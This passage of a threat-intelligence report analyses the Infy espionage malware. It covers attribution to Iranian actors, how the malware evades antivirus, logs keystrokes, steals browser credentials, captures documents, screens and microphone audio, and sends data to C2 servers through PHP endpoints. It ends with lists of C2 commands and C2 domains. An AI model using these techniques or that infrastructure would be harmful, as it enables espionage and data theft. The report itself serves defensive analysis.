<p>We refer to the malware as “Infy” because the actor used this string in multiple locations, including filenames (“infy74f1.exe” &#8211; <em>Infy version 7.4 F1</em>), C2 strings (“subject=INFY M 7.8”), and C2 folder names.</p>
<h3>Attribution</h3>
<p>The Gmail account sending the emails in the attack that we first observed (Figure 8), belongs to an Israeli victim. That account was itself victim of an e-mail-borne attack that compromised the user&#8217;s system and e-mail account.</p>
<p>&nbsp;</p>
<p><a href="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-8.png"  rel="wpdevart_lightbox attachment wp-att-13450" ><img class="aligncenter size-large wp-image-13450" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-8-500x108.png" alt="Prince of Persia 8" width="500" height="108" /></a></p>
<p style="text-align: center;"><em>Figure 8 First-observed attack, via email</em></p>
<p>Among WHOIS records for first-party domains used in the C2 infrastructure, we find three email accounts bearing a strong similarity in naming pattern:</p>
<p><a href="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-8_2.png"  rel="wpdevart_lightbox attachment wp-att-13452" ><img class="aligncenter size-large wp-image-13452" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-8_2-500x121.png" alt="Prince of Persia 8_2" width="500" height="121" /></a></p>
<p>The WHOIS records with the first two email addresses (and other C2 domains) have apparently fake WHOIS content. The “aminjalali_58 (at) yahoo.com” email address is associated with 6 known C2 domains, dating back to 2010. Unlike the fake WHOIS examples, this example has content more consistent with the email address:</p>
<p><em>amin jalali</em><br />
<em>safehostonline</em><br />
<em>afriqa street number 68</em><br />
<em>tehran</em><br />
<em>Tehran</em><br />
<em>19699</em><br />
<em>IR</em><br />
<em>+98.935354252</em><br />
<em>aminjalali_58 (at) yahoo.com</em></p>
<p>The name “Amin Jalali” is not unique, though it does appear to have Iranian-specific origins. We find profiles and artifacts combining the name and “58”, which may (or may not) be the same individual, and all of which have Iranian links.</p>
<p>When we look at domains on neighboring IP addresses from known first-party C2s, we observe numerous Iranian domains, suggesting possibly an Iranian hosting reseller – and in at least one case, a free Iranian web host (Figure 9).</p>
<p><a href="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-9.png"  rel="wpdevart_lightbox attachment wp-att-13451" ><img class="aligncenter size-large wp-image-13451" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-9-500x223.png" alt="Prince of Persia 9" width="500" height="223" /></a></p>
<p style="text-align: center;"><em>Figure 9 Neighbor IP addresses with Iranian domains</em></p>
<h3>Conclusion</h3>
<p>We have enough evidence to conclude a pattern of behavior following extensive analysis of this malware and C2 infrastructure between these samples. The activity has been observed over almost 10 years, with the malware being constantly improved and developed. The low-volume of activity, deliberate campaign focus and content tailoring, and nature of targets hints at the goals of this actor.</p>
<p>We believe that we have uncovered a decade-long operation that has successfully stayed under the radar for most of its existence as targeted espionage originating from Iran. It is aimed at governments and businesses of multiple nations as well as its own citizens.</p>
<p>Palo Alto Networks customers are protected from this threat in the following ways:</p>
<ol>
<li>WildFire accurately identifies all malware samples related to this operation as malicious.</li>
<li>Domains used by this operation have been flagged as malicious in Threat Prevention.</li>
<li>AutoFocus users can view malware related to this attack using the “Infy tag.</li>
</ol>
<p>IOCs can be found in the appendices of this report.</p>
<p>Special thanks to Michael Scott for assistance with Maltego in this investigation.</p>
<h3>Appendix 1 &#8211; Detailed Infy Malware Analysis</h3>
<p>Although Infy is fundamentally one malware family, we observe two distinct variants. The regular variant “Infy” is versioned by the malware author 1-30 (1999 -15999 sub-versions). In addition, we observe a distinct variant “Infy M” developed in parallel with the regular variant since about 2013. Infy M appears to be a full featured variant, deployed against high-value targets. It includes more functionality: while the original variant has no remote control, “M” adds the ability for the C2 to issue commands to the malware via C2 PHP scripts; HTTP support; a hidden GUI control panel; and FTP client.</p>
<h4>Infy</h4>
<p>Detailed analysis of a recent Infy sample (version 30, active from 24 February 2016):</p>
<p>The initial executable first checks for installed antivirus programs. It uses the Windows API function “GetFileattributeA” on a list of several common AV installation directories, testing any positive return with “file_attribute_directory&#8221;. Depending on which AV Infy finds, it will either abort, or install the malicious Infy DLL using a different technique. This concern with avoiding client-AV detection, skipping installation rather than risk alerting, is somewhat noteworthy (as opposed to the relatively common sandbox-detection techniques). The EXE installs the DLL, writes to the autorun key, and does nothing else until restart.</p>
<p>Upon restart, the EXE loader executes the main function, exported by the DLL malware file DLL (previously we observed functions named “start1/start2/start3”) with the parameter /rcv (this version uses a decryption offset of 19). It installs itself in “cyberlink” directory.</p>
<p>It will then search for files with “bak”, “csv”, or “cnt”, extensions. If the parameter “/rcv” was used, it starts a keylogger (the keylogger uses a window name “TRON2VDLLB” (GetMessageA/translate message/DispatchMessageA). It next registers hotkeys, and gets clipboard data. Get_browser_data steals passwords, forms, cookies, history (from Microsoft Edge, Internet Explorer, Google Chrome, Opera, and Firefox).</p>
<p>The malware connects to the C2 every five minutes using HTTP, posting:</p>
<p>&lt;computer name&gt;<br />
&lt;user name&gt;<br />
dn = n1<br />
ver = 30<br />
lfolder= f<br />
cpuid=<br />
machineguid (from hklm\SOFTWARE\Microsoft\Cryptography\machineguid)<br />
tt= time</p>
<p>After posting data about the infected system to the C2 server, the malware downloaded an update named “v30nXf1.tmp” file to %temp%\drvtem64.tmp. If the download is successful, the malware writes “OK, Downloaded [url file]” to log file. It then connects again, with a similar posting format, but this time also adding “tt=” (time) and “cpuid=”. It installs the downloaded file with parameter &#8220;-sp/ins -pBA5a88E&#8221;. A third connection adds “sfolder”, “subject”, and this time exfiltrates data in the “body=” parameter.</p>
<p>Each variant of Infy uses specific “cover” camouflage to with file metadata that makes it appear as though it is legitimate software. In this case, the file used the software name “Cyberlink,” and a description of “CLMediaLibrary Dynamic Link Library” and listing version 4.19.9.98.</p>
<h4>Infy M</h4>
<p>We observed the Infy M variant with versions 6.1 through 7.8, adding features including screen capture, document capture &amp; upload, and microphone capture. Infy M supports the following C2 commands:</p>
<p>ASIDLE &#8211; idle<br />
ASDIR – directory list of files<br />
ASPUT – download file<br />
ASGET – upload file<br />
ASZIPGET – upload as zip<br />
ASDELETE – delete file<br />
ASRENAME – rename file<br />
ASRUN – execute file<br />
ASENDTASK – terminate process<br />
ASZIP – zip file<br />
ASSHELL – remote shell</p>
<p>The “M” variant uses mostly distinct C2 servers from the regular Infy samples (although very recently, we also observed version 7.8 using C2 “youripinfo.com”, previously seen as C2 for the regular variant):</p>
<p>bestupdateserver[.]com – Observed 2013-12-09<br />
www.bestupdateserver[.]com &#8211; Observed 2013-04-26<br />
bestbox3[.]com – Observed 2015-08-25<br />
www.bestupdateserver2[.]com &#8211; Observed 2015-05-22<br />
bestupdateserver2[.]com – Observed 2014-07-16</p>
<h4>Analysis of an early version of “M”, 6.2</h4>
<p>Versions 6.x of the Infy M variant camouflage themselves with file and window names set to Borland hcrtf. They use a single EXE, rather than a loader EXE and payload DLL as seen in the original variant. The malware initially performs a check to see if the victim as already infected by checking for window names “Borland hcrtf 6.x” or “Macromedia Swsoc 7.x”.</p>
<p>We have identified five hidden GUI control forms in Infy M, one of which is not used. The first form includes three possible parameters. Parameter “/ins” installs the Trojan. It first creates and starts the service and on Windows versions prior to Vista it requires the “/s” parameter. After installing itself, the malware deletes any previous Infy installations. The does this by terminating processes and deleting Infy files in %system32%, %appdata%, %appdata%\hcrtf (for example, pre-6.1 files incsy32.exe, incs32.exe, ntvdn.exe, grep.exe, hcrtf.exe, grep.dll). It then renames the ini file from grepc.ini to hcrtfc.ini. It completes clean-up by deleting the “inverse Ser32”, “grep”, and “hcrtf” services. Finally, it downloads and executes the update file from the C2 at /infy/update.php.</p>
<p>The /c (copy) parameter sets up autostart for the malware by writing to registry key “run” (Windows Vista and above) or “runservices” (versions prior to Windows Vista). The /s (service) parameter creates and starts the service (Windows Vista and later). At this point, the malware waits, and handles any commands issued over HTTP from the C2 (for example, execute a remote shell upon receiving command “ASSHELL”).</p>
<p>The second form monitors for new or modified document files using “CreateIoCompletionPort” and “ReadDirectoryChangesW”. It targets document file types .doc, .xls , .jpg, .jpe, .txt, .htm, .pgp, .pdf, .zip, and .rar and ZIP compresses them (using the password “Z8(2000_2001uI”) into a file located at \Program Files\Yahoo!\Messenger\Profiles\yfsbg\yfsbg\3dksf.tmp.</p>
<p>The third form takes a screen captures and stores it the “yfsbg” folder as 4dksf.tmp. It the uploads the screenshot and document-capture files using POST (instead of using GET as seen in the regular variants) to &lt;C2 server&gt;/infy/fms.php.</p>
<p>The fourth form is not used. The fifth form is used for microphone capture.</p>
<p>The 7.x versions install themselves as swsoc.exe (7.4 also seen using infy74f1.exe) at &lt;documents and settings&gt;\all users\application data\macromedia\8080\swsoc.exe. They also create a subfolder “fsbg”, where they store the copies of documents opened by the user. These are stored with their CRC value as their filename, RAR compressed with the same password “Z8(2000_2001uI”.</p>
<p>We observed a server reply with error in the PHP, giving us some of their underlying file structure:</p>
<p>&lt;b&gt;Warning&lt;/b&gt;: Cannot modify header information &#8211; headers already sent by (output started at /home/bestupda/public_html/infy/fms.php:115) in &lt;b&gt;/home/bestupda/public_html/infy/fms.php&lt;/b&gt; on line &lt;b&gt;116&lt;/b&gt;&lt;br /&gt;</p>
<p>Upgrade requests are observed with this syntax (here, version 6.2 to the latest version):</p>
<p>http://www.bestupdateserver.com/infy/update.php?cn=&lt;computername&gt;&amp;ver=6.2&amp;u=27/3/2016 20:37:23</p>
<h3>Appendix 2 – Observed Hashes</h3>
<p>A list of hashes for associated files observed in this operation can be found <a href="https://github.com/pan-unit42/iocs/blob/master/prince_of_persia/hashes.csv">here</a>.</p>
<h3>Appendix 3 – Observed Infy C2 Domains</h3>
<p>analyse1[.]mooo[.]com<br />
best[.]short-name[.]com<br />
best2[.]short-name[.]com<br />
best2[.]short-url20[.]com<br />
best3[.]short-url20[.]com<br />
best4[.]short-url20[.]com<br />
best5[.]short-url20[.]com<br />
best6[.]short-url20[.]com<br />
best7[.]short-url20[.]com<br />
bestbox3[.]com<br />
bestupdateserver[.]com<br />
bestupdateserver2[.]com<br />
bestupser[.]awardspace[.]info<br />
bestwebstat[.]com<br />
bl2pe[.]bestwebstat[.]com<br />
box4054[.]net<br />
c1[.]short-url20[.]com<br />
dbook[.]soon[.]it<br />
dsite[.]dyx[.]comextd[.]mine[.]bz<br />
fastecs[.]netfirms[.]com<br />
fastupdate[.]net<br />
gstat[.]strangled[.]net<br />
lost[.]updateserver1[.]com<br />
lu[.]ige[.]es<br />
mand[.]pwnz[.]org<br />
myblog2000[.]com<br />
ns2[.]myblog2000[.]com<br />
nus[.]soon[.]it<br />
safehostonline[.]com<br />
secup[.]soon[.]it<br />
short-name[.]com<br />
short-url20[.]com<br />
update[.]info[.]gf<br />
updatebox4[.]com<br />
updateserver1[.]com<br />
updateserver3[.]com<br />
us1[.]short-name[.]com<br />
us12[.]short-url20[.]com<br />
us13[.]short-url20[.]com<br />
us15[.]short-url20[.]com<br />
us16[.]short-url20[.]com<br />
us1s2[.]strangled[.]net<br />
wep[.]archvisio[.]com<br />
wep[.]soon[.]it<br />
wpstat[.]mine[.]bz<br />
wpstat[.]strangled[.]net<br />
www[.]fastupdate[.]net<br />
www[.]updateserver1[.]com<br />
youripinfo[.]com</p>
<p>&nbsp;</p>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>

<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p>© 2020 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
            <script type="text/javascript">
            (function(){
                document.addEventListener('DOMContentLoaded', function(){
                    let wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                    if ( wpp_widgets ) {
                        for (let i = 0; i < wpp_widgets.length; i++) {
                            let wpp_widget = wpp_widgets[i];
                            WordPressPopularPosts.theme(wpp_widget);
                        }
                    }
                });
            })();
        </script>
                <script>
            var WPPImageObserver = null;

            function wpp_load_img(img) {
                if ( ! 'imgSrc' in img.dataset || ! img.dataset.imgSrc )
                    return;

                img.src = img.dataset.imgSrc;

                if ( 'imgSrcset' in img.dataset ) {
                    img.srcset = img.dataset.imgSrcset;
                    img.removeAttribute('data-img-srcset');
                }

                img.classList.remove('wpp-lazyload');
                img.removeAttribute('data-img-src');
                img.classList.add('wpp-lazyloaded');
            }

            function wpp_observe_imgs(){
                let wpp_images = document.querySelectorAll('img.wpp-lazyload'),
                    wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                if ( wpp_images.length || wpp_widgets.length ) {
                    if ( 'IntersectionObserver' in window ) {
                        WPPImageObserver = new IntersectionObserver(function(entries, observer) {
                            entries.forEach(function(entry) {
                                if (entry.isIntersecting) {
                                    let img = entry.target;
                                    wpp_load_img(img);
                                    WPPImageObserver.unobserve(img);
                                }
                            });
                        });

                        if ( wpp_images.length ) {
                            wpp_images.forEach(function(image) {
                                WPPImageObserver.observe(image);
                            });
                        }

                        if ( wpp_widgets.length ) {
                            for (var i = 0; i < wpp_widgets.length; i++) {
                                let wpp_widget_images = wpp_widgets[i].querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widgets[i].shadowRoot ) {
                                    wpp_widget_images = wpp_widgets[i].shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    wpp_widget_images.forEach(function(image) {
                                        WPPImageObserver.observe(image);
                                    });
                                }
                            }
                        }
                    } /** Fallback for older browsers */
                    else {
                        if ( wpp_images.length ) {
                            for (var i = 0; i < wpp_images.length; i++) {
                                wpp_load_img(wpp_images[i]);
                                wpp_images[i].classList.remove('wpp-lazyloaded');
                            }
                        }

                        if ( wpp_widgets.length ) {
                            for (var j = 0; j < wpp_widgets.length; j++) {
                                let wpp_widget = wpp_widgets[j],
                                    wpp_widget_images = wpp_widget.querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widget.shadowRoot ) {
                                    wpp_widget_images = wpp_widget.shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    for (var k = 0; k < wpp_widget_images.length; k++) {
                                        wpp_load_img(wpp_widget_images[k]);
                                        wpp_widget_images[k].classList.remove('wpp-lazyloaded');
                                    }
                                }
                            }
                        }
                    }
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                wpp_observe_imgs();

                // When an ajaxified WPP widget loads,
                // Lazy load its images
                document.addEventListener('wpp-onload', function(){
                    wpp_observe_imgs();
                });
            });
        </script>
        <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
